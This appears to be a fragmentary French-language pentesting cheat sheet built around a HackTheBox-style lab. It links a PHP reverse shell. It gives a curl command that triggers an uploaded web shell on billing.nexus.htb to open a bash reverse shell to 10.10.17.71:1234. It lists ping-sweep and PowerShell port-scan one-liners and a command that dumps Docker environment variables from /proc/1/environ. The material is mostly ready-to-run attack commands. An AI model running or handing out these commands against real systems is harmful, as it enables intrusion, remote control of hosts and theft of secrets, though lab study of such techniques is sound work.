...
- Reverse shell PHP --> [PentestMonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
    ...
    - REVERSE SHELL VIA URL --> `curl -G 'http://billing.nexus.htb/storage/tinymce/fee2ef42df021eb62671949f1a4aa32e.php' --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.17.71/1234 0>&1"'`
...
- Depuis une machine Windows : 
	- Voir les machines actives --> `for i in {1..254} ;do (ping 172.16.1.$i -c 1 -w 5  >/dev/null && echo "172.16.1.$i" &) ;done` ou ` 1..254 | % {"172.16.2.$($_): $(Test-Connection -count 1 -comp 172.16.2.$($_) -quiet)"}`
   	- Voir les ports ouverts sur une machine Windows --> `1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("192.168.1.1",$_)) "Port $_ is open!"} 2>$null` ou `$ip='10.0.0.10'; 22,80,443,445,1433,3389,5985,873 | % { $t=New-Object Net.Sockets.TcpClient; $c=$t.ConnectAsync($ip,$_); if($c.Wait(200)){Write-Host "$($ip):$($_) OPEN"}; $t.Close() }`
...
- Récupérer les variables d'environnement Docker --> `cat /proc/1/environ | tr '\0' '\n'`
